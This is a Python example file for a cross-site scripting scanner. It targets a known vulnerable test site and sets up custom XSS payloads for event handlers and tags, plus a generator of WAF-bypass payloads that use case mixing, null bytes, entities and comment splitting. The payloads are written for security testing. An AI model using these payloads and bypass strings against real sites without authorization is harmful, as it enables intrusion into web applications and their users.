#!/usr/bin/env python3
"""
Configuration examples for XSS Scanner
Shows how to customize scanner behavior
"""

from xss_scanner import XSSScanner, InjectionContext, PayloadGenerator


class CustomPayloadGenerator(PayloadGenerator):
    """
    Example: Extend PayloadGenerator with custom payloads
    """
    
    def _html_text_payloads(self):
        """Override with custom HTML text payloads"""
        # Get default payloads
        default = super()._html_text_payloads()
        
        # Add custom payloads
        custom = [
            f"<marquee>alert('{self.marker}')</marquee>",
            f"<details open ontoggle=alert('{self.marker}')>",
            f"<base href='javascript:alert(\"{self.marker}\")//'>",
        ]
        
        return default + custom
    
    def _attribute_name_payloads(self):
        """Add more attribute name payloads"""
        default = super()._attribute_name_payloads()
        
        # Additional event handlers
        custom = [
            f"onwheel=alert('{self.marker}') x",
            f"onscroll=alert('{self.marker}') y",
            f"oninput=alert('{self.marker}') z",
            f"onpointerover=alert('{self.marker}') w",
        ]
        
        return default + custom


class Configuration:
    """
    Centralized configuration for scanning
    """
    
    # Scanner settings
    TIMEOUT = 10
    USER_AGENT = "XSS-Scanner/1.0 (Security Testing)"
    MAX_WORKERS = 5  # For parallel scanning
    
    # Target settings
    TARGET_URL = "http://testphp.vulnweb.com/search.php"
    
    # Parameters to test
    COMMON_PARAMS = [
        # Search/Query parameters
        "q", "search", "query", "term", "keyword",
        # Filter/Sort parameters
        "filter", "sort", "order", "category",
        # User input
        "name", "email", "message", "comment",
        # Page parameters
        "page", "id", "view", "action",
        # Data parameters
        "data", "input", "value", "text",
    ]
    
    # Contexts to test
    ALL_CONTEXTS = [
        InjectionContext.HTML_TEXT,
        InjectionContext.HTML_ATTRIBUTE_VALUE,
        InjectionContext.HTML_ATTRIBUTE_NAME,
        InjectionContext.HTML_TAG_NAME,
        InjectionContext.JAVASCRIPT,
        InjectionContext.SCRIPT_TAG,
        InjectionContext.URL_PARAM,
    ]
    
    # Common contexts (faster scan)
    COMMON_CONTEXTS = [
        InjectionContext.HTML_TEXT,
        InjectionContext.HTML_ATTRIBUTE_VALUE,
        InjectionContext.HTML_ATTRIBUTE_NAME,
    ]
    
    # Authentication
    AUTH_HEADERS = {
        # "Authorization": "Bearer YOUR_TOKEN_HERE",
        # "X-API-Key": "YOUR_API_KEY_HERE",
    }
    
    AUTH_COOKIES = {
        # "session": "YOUR_SESSION_COOKIE_HERE",
        # "user_id": "YOUR_USER_ID_HERE",
    }
    
    # Custom headers
    CUSTOM_HEADERS = {
        "Accept": "text/html,application/xhtml+xml",
        "Accept-Language": "en-US,en;q=0.9",
        "Accept-Encoding": "gzip, deflate",
        "Connection": "keep-alive",
    }
    
    # Report settings
    HTML_REPORT_FILE = "xss_scan_report.html"
    TERMINAL_REPORT = True


def create_custom_scanner():
    """
    Create a scanner with custom configuration
    """
    scanner = XSSScanner(
        timeout=Configuration.TIMEOUT,
        user_agent=Configuration.USER_AGENT
    )
    
    # Use custom payload generator
    scanner.payload_generator = CustomPayloadGenerator()
    
    return scanner


def scan_with_config():
    """
    Example: Scan using configuration
    """
    print("Starting scan with custom configuration...")
    
    scanner = create_custom_scanner()
    
    # Perform scan
    results = scanner.scan_url(
        url=Configuration.TARGET_URL,
        parameters=Configuration.COMMON_PARAMS[:3],  # Test first 3 params
        contexts=Configuration.COMMON_CONTEXTS,
        method='GET',
        headers=Configuration.CUSTOM_HEADERS,
        cookies=Configuration.AUTH_COOKIES
    )
    
    # Generate reports
    if Configuration.TERMINAL_REPORT:
        print(scanner.generate_report_terminal())
    
    scanner.generate_report_html(Configuration.HTML_REPORT_FILE)
    
    return results


def scan_profile():
    """
    Example: Create scanning profiles for different scenarios
    """
    
    profiles = {
        "quick": {
            "contexts": [InjectionContext.HTML_TEXT],
            "params": ["q", "search"],
            "parallel": False
        },
        "standard": {
            "contexts": Configuration.COMMON_CONTEXTS,
            "params": Configuration.COMMON_PARAMS[:5],
            "parallel": True
        },
        "comprehensive": {
            "contexts": Configuration.ALL_CONTEXTS,
            "params": Configuration.COMMON_PARAMS,
            "parallel": True
        }
    }
    
    return profiles


def example_quick_scan():
    """Quick scan for rapid testing"""
    print("\n=== Quick Scan Profile ===")
    
    scanner = XSSScanner(timeout=5)
    profiles = scan_profile()
    profile = profiles["quick"]
    
    results = scanner.scan_url(
        url=Configuration.TARGET_URL,
        parameters=profile["params"],
        contexts=profile["contexts"],
        method='GET'
    )
    
    print(f"Found {len(results)} reflections")


def example_comprehensive_scan():
    """Comprehensive scan with all contexts"""
    print("\n=== Comprehensive Scan Profile ===")
    
    scanner = create_custom_scanner()
    profiles = scan_profile()
    profile = profiles["comprehensive"]
    
    if profile["parallel"]:
        results = scanner.scan_parallel(
            url=Configuration.TARGET_URL,
            parameters=profile["params"],
            contexts=profile["contexts"],
            method='GET',
            max_workers=Configuration.MAX_WORKERS
        )
    else:
        results = scanner.scan_url(
            url=Configuration.TARGET_URL,
            parameters=profile["params"],
            contexts=profile["contexts"],
            method='GET'
        )
    
    print(f"Found {len(results)} reflections")
    scanner.generate_report_html("comprehensive_report.html")


def example_authenticated_scan():
    """Example: Scan with authentication"""
    print("\n=== Authenticated Scan ===")
    
    scanner = XSSScanner()
    
    # Custom session setup
    session_cookies = {
        "session": "abc123xyz789",
        "user_id": "12345"
    }
    
    auth_headers = {
        "Authorization": "Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9...",
        "X-CSRF-Token": "csrf_token_here"
    }
    
    results = scanner.scan_url(
        url="http://example.com/dashboard/search",
        parameters=["q", "filter"],
        contexts=[InjectionContext.HTML_TEXT, InjectionContext.HTML_ATTRIBUTE_VALUE],
        method='GET',
        headers=auth_headers,
        cookies=session_cookies
    )
    
    print(f"Found {len(results)} reflections")


def example_post_form_scan():
    """Example: Scan POST form with additional data"""
    print("\n=== POST Form Scan ===")
    
    scanner = XSSScanner()
    
    # Form data that should remain constant
    form_data = {
        "csrf_token": "abc123",
        "submit": "true",
        "action": "search"
    }
    
    # Parameters to test (will be added to form_data)
    test_params = ["search_query", "user_input", "comment"]
    
    results = scanner.scan_url(
        url="http://example.com/search",
        parameters=test_params,
        contexts=Configuration.COMMON_CONTEXTS,
        method='POST',
        data=form_data
    )
    
    print(f"Found {len(results)} reflections")


def example_waf_bypass_payloads():
    """
    Example: Custom payloads for WAF bypass
    (Educational purpose - always test with authorization)
    """
    
    class WAFBypassPayloadGenerator(PayloadGenerator):
        """Payloads designed to bypass common WAF rules"""
        
        def _html_text_payloads(self):
            return [
                # Case variation
                f"<ScRiPt>alert('{self.marker}')</sCrIpT>",
                # Null byte
                f"<script\x00>alert('{self.marker}')</script>",
                # HTML entities
                f"<script>&#97;lert('{self.marker}')</script>",
                # Comment breaking
                f"<scr<!--comment-->ipt>alert('{self.marker}')</script>",
                # Newline insertion
                f"<script\n>alert('{self.marker}')</script>",
            ]
    
    scanner = XSSScanner()
    scanner.payload_generator = WAFBypassPayloadGenerator()
    
    print("WAF bypass payload generator configured")
    return scanner


if __name__ == "__main__":
    print("""
╔══════════════════════════════════════════════════════════════╗
║          XSS Scanner - Configuration Examples               ║
╚══════════════════════════════════════════════════════════════╝
    """)
    
    print("\nAvailable examples:")
    print("1. Quick Scan")
    print("2. Comprehensive Scan")
    print("3. Authenticated Scan")
    print("4. POST Form Scan")
    print("5. WAF Bypass Payloads")
    print("6. Scan with Configuration")
    
    choice = input("\nSelect example (1-6): ").strip()
    
    examples = {
        "1": example_quick_scan,
        "2": example_comprehensive_scan,
        "3": example_authenticated_scan,
        "4": example_post_form_scan,
        "5": example_waf_bypass_payloads,
        "6": scan_with_config,
    }
    
    if choice in examples:
        try:
            examples[choice]()
        except Exception as e:
            print(f"\n[!] Error: {e}")
    else:
        print("[!] Invalid choice")
